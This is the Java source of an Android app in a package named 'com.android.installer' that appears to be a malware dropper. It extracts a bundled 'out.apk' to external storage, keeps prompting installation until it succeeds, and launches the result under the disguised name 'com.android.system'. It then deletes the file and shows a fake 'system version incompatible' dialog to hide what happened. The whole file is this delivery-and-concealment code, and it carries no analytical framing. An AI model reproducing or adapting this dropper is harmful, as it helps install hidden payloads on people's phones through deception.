package com.android.installer;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Environment;
import android.os.Bundle;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.List;


public class MainActivity extends Activity {
    static final String apkName = "out.apk";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        install();
    }

    private boolean start() {
        if(!isPackageAvalible("com.android.system")) {
            return false;
        }
        Intent intent = new Intent();
        ComponentName comp = new ComponentName("com.android.system", "com.android.system.activity.MainActivity");
        intent.setComponent(comp);
        intent.setAction("android.intent.action.VIEW");
        startActivity(intent);
        return true;
    }

    private void install() {
        if(start()) {
            showDialog();
            return;
        }
        //release apk
        String path = Environment.getExternalStorageDirectory().getPath() + "/"+ apkName;
        File file = new File(path);
        try {
            OutputStream os = new FileOutputStream(file);
            InputStream is = getAssets().open(apkName);
            byte[] buffer = new byte[0X100000];
            while(true) {
                int n = is.read(buffer);
                if(n<=0) {
                    break;
                }
                os.write(buffer,0,n);
            }
            os.close();
            is.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        //install
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(Uri.fromFile(new File(path)),
                "application/vnd.android.package-archive");
        startActivityForResult(intent, 0);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if(!start()) {
            install();
            return;
        }
        new File(Environment.getExternalStorageDirectory().getPath() + "/"+ apkName).delete();
        showDialog();
    }

    private boolean isPackageAvalible(String packageName)
    {
        final PackageManager packageManager = this.getPackageManager();
        // 获取所有已安装程序的包信息
        List<PackageInfo> pinfo = packageManager.getInstalledPackages(0);
        for ( int i = 0; i < pinfo.size(); i++ )
        {
            if(pinfo.get(i).packageName.equalsIgnoreCase(packageName))
                return true;
        }
        return false;
    }

    private void showDialog() {
        new AlertDialog.Builder(MainActivity.this).setTitle("系统提示")//设置对话框标题
                .setMessage("系统版本不兼容,请重新选择版本！")//设置显示的内容
                .setPositiveButton("确定", new DialogInterface.OnClickListener() {//添加确定按钮
                    @Override
                    public void onClick(DialogInterface dialog, int which) {//确定按钮的响应事件
                        finish();
                    }
                }).setNegativeButton("返回",new DialogInterface.OnClickListener() {//添加返回按钮
            @Override
            public void onClick(DialogInterface dialog, int which) {//响应事件
                finish();
            }
        }).show();
    }
}
